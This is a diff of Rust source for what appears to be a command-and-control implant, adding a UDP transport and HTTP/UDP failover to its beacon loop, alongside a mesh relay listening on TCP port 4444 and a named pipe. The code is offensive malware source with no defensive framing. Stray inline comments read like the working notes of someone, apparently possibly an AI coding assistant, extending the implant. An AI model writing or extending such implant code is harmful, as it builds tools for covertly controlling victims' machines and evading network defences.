@@ -234,7 +234,85 @@ impl Transport for HttpTransport {
     }
 }
 
-fn perform_handshake(transport: &mut HttpTransport) -> Result<NoiseTransport, ()> {
+// UDP Transport
+#[cfg(not(target_os = "windows"))]
+pub struct UdpTransport {
+    host: &'static str,
+    port: u16,
+}
+
+#[cfg(not(target_os = "windows"))]
+impl UdpTransport {
+    pub fn new(host: &'static str, port: u16) -> Self {
+        Self { host, port }
+    }
+}
+
+#[cfg(not(target_os = "windows"))]
+impl Transport for UdpTransport {
+    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
+        unsafe {
+            // UDP socket
+            let sock = sys_socket(2, 2, 0); // AF_INET, SOCK_DGRAM
+            if (sock as isize) < 0 { return Err(()); }
+
+            let mut ip_bytes = [0u8; 4];
+            let mut parts = self.host.split('.');
+            for i in 0..4 {
+                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
+            }
+            let sin_addr = u32::from_ne_bytes(ip_bytes);
+
+            let addr = SockAddrIn {
+                sin_family: 2,
+                sin_port: self.port.to_be(),
+                sin_addr,
+                sin_zero: [0; 8],
+            };
+
+            let sent = sys_sendto(sock, data.as_ptr(), data.len(), 0, &addr as *const _ as *const u8, 16);
+            if sent < 0 {
+                sys_close(sock);
+                return Err(());
+            }
+
+            let mut buf = [0u8; 4096];
+            let mut src_addr = SockAddrIn { sin_family: 0, sin_port: 0, sin_addr: 0, sin_zero: [0; 8] };
+            let mut addr_len = 16u32;
+            
+            let n = sys_recvfrom(sock, buf.as_mut_ptr(), 4096, 0, &mut src_addr as *mut _ as *mut u8, &mut addr_len);
+            sys_close(sock);
+
+            if n > 0 {
+                Ok(buf[..n as usize].to_vec())
+            } else {
+                Err(())
+            }
+        }
+    }
+}
+
+#[cfg(target_os = "windows")]
+pub struct UdpTransport {
+    host: &'static str,
+    port: u16,
+}
+
+#[cfg(target_os = "windows")]
+impl UdpTransport {
+    pub fn new(host: &'static str, port: u16) -> Self {
+        Self { host, port }
+    }
+}
+
+#[cfg(target_os = "windows")]
+impl Transport for UdpTransport {
+    fn request(&mut self, _data: &[u8]) -> Result<Vec<u8>, ()> {
+        Err(())
+    }
+}
+
+fn perform_handshake(transport: &mut dyn Transport) -> Result<NoiseTransport, ()> {
     let keypair = NoiseKeypair::generate().map_err(|_| ())?;
     let mut noise = NoiseHandshake::new_initiator(&keypair).map_err(|_| ())?;
 
@@ -264,19 +342,27 @@ fn perform_handshake(transport: &mut HttpTransport) -> Result<NoiseTransport, ()
 pub fn run_beacon_loop(_initial_config: C2Config) -> !
 {
     let config = C2Config::get_global();
-    let mut transport = HttpTransport::new(config.server_addr, 8080);
+    let mut http_transport = HttpTransport::new(config.server_addr, 8080);
+    let mut udp_transport = UdpTransport::new(config.server_addr, 9999);
+    
+    let mut use_udp = matches!(config.transport, TransportType::Udp);
+
     let mut mesh_server = crate::modules::mesh::MeshServer::new();
     let _ = mesh_server.start_tcp(4444);
     let _ = mesh_server.start_pipe("wraith_mesh");
 
     let mut session;
     loop {
-        match perform_handshake(&mut transport) {
+        let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
+        
+        match perform_handshake(transport) {
             Ok(s) => {
                 session = s;
                 break;
             },
             Err(_) => {
+                // Failover
+                use_udp = !use_udp;
                 crate::utils::obfuscation::sleep(config.sleep_interval);
             }
         }
@@ -299,6 +385,7 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
         for (data, client_idx) in mesh_data {
             let mut relay_frame = WraithFrame::new(packet::FRAME_TYPE_MESH_RELAY, data);
             relay_frame.stream_id = client_idx as u16;
+            let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
             if let Ok(msg_to_send) = session.write_message(&relay_frame.serialize()) {
                 let _ = transport.request(&msg_to_send);
             }
@@ -325,10 +412,18 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
         if let Ok(msg_to_send) = session.write_message(&frame_bytes) {
             packet_count += 1;
 
+            let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
             if let Ok(resp) = transport.request(&msg_to_send) {
                 if let Ok(pt) = session.read_message(&resp) {
-                    dispatch_tasks(&pt, &mut session, &mut transport, &mut mesh_server);
+                    // Pass transport to dispatch_tasks if needed (it takes &mut HttpTransport in original, needs update)
+                    // Wait, dispatch_tasks took &mut HttpTransport?
+                    // Yes: `dispatch_tasks(..., transport: &mut HttpTransport, ...)`
+                    // I need to change signature of dispatch_tasks too.
+                    dispatch_tasks(&pt, &mut session, transport, &mut mesh_server);
                 }
+            } else {
+                // Failover on request failure
+                use_udp = !use_udp;
             }
         }
 
@@ -370,7 +465,7 @@ use zeroize::Zeroize;
 
 // ...
 
-fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut HttpTransport, mesh_server: &mut crate::modules::mesh::MeshServer) {
+fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn Transport, mesh_server: &mut crate::modules::mesh::MeshServer) {
     if let Some(frame) = WraithFrame::deserialize(data) {
         if frame.frame_type == packet::FRAME_TYPE_REKEY {
             // Double Ratchet handles rekeying automatically
